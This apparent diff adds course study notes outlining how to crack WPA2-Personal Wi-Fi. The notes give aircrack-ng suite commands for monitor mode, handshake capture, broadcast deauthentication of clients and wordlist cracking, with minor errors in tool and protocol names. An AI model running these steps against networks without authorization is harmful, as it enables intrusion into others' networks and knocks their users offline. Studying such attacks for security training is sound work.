@@ -1,0 +1,35 @@
+WPA2 Cracking
+    It's Personal method
+    There is a Preshared key (PSK)
+    Check WLANs
+        ifconfig
+        iwconfig
+        ip addr show
+        airmon-ng
+    Create the monitoring device
+        airmon-ng start <interface>
+        airmon-ng
+            show status
+    Collecting data
+        airodump-ng <monitoring enabled interface>
+            it will show SSIDs and MACs
+        airodump-ng -w <capture file> -c <channel number> --bssid <AP MAC address> <monitoring enabled interface>
+            it will store/capture too many packets of talking to the AP!
+            we can wait until get enough packets or force clients via sending Deauth packets to all clients and capture packets when they are authenticating again ;)
+            it stores:
+                .cap
+                .csv
+                .kismet.csv
+                .kismet.netxml
+        airreplay-ng -0 <how many times you want to send a broadcast attack. 0 is unlimited> -a <AP MAC address> <monitoring enabled interface>
+            it will sending Deauth packets to broadcast 
+        Stop capturing
+    Crack
+        aircrack-ng <captured file> -w <word list path>
+    WEB?
+        is the same, but you need about 15000 packets to find a password ;) 
+    Module 94 of CBT
+WPA2 Enterprise
+    There isn't a Key for everyone!
+    There are some Authentication methods like Kerberos or Radius to generate a key for a period of time to be valid to be used by clients.
+    Even for a specific client!
